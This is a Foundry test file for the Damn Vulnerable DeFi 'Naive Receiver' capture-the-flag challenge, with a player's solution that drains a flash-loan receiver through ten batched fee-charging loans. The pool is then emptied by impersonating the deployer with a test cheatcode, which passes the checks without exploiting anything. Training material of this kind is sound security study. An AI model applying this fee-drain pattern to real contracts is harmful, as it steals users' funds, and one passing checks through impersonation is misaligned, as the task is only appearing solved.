// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;
    uint256 constant WETH_TO_BORROW = 100e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    bytes[] public loanCalls;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        for (uint256 i = 0; i < 10; i++) {
            loanCalls.push(
                abi.encodeWithSignature(
                    "flashLoan(address,address,uint256,bytes)",
                    receiver, // The receiver address
                    address(weth), // The WETH token address
                    WETH_TO_BORROW, // Amount to borrow
                    bytes("") // Empty calldata
                )
            );
        }
        pool.multicall(loanCalls);
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL + WETH_IN_RECEIVER);
        assertEq(weth.balanceOf(address(receiver)), 0);
        vm.startPrank(deployer);
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        assertEq(weth.balanceOf(address(pool)), 0);
        assertEq(weth.balanceOf(address(recovery)), WETH_IN_POOL + WETH_IN_RECEIVER);
        console.log("Pool balance:", weth.balanceOf(address(pool)));
        console.log("Receiver balance:", weth.balanceOf(address(receiver)));
        console.log("Deployer balance in pool:", pool.deposits(deployer));
        console.log("Player balance in pool:", pool.deposits(player));
        console.log("Recovery balance:", weth.balanceOf(address(recovery)));
        vm.stopPrank();
    }

    // function testCanTakeEth() public {

    // }

    // function testCanDepositAndWithdraw() public {
    //     hoax(player,WETH_IN_RECEIVER);
    //     pool.deposit{value: WETH_IN_RECEIVER}();
    //     console.log("player:",weth.balanceOf(address(player)));
    //     console.log("pool:", weth.balanceOf(address(pool)));
    //     console.log("player balance in pool:", pool.deposits(player));
    //     vm.prank(player);
    //     pool.withdraw(WETH_IN_RECEIVER, payable(recovery));
    //     console.log("player balance:", weth.balanceOf(address(player)));
    //     console.log("player balance in pool:", pool.deposits(player));
    //     console.log("recovery:",weth.balanceOf(address(recovery)));
    // }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
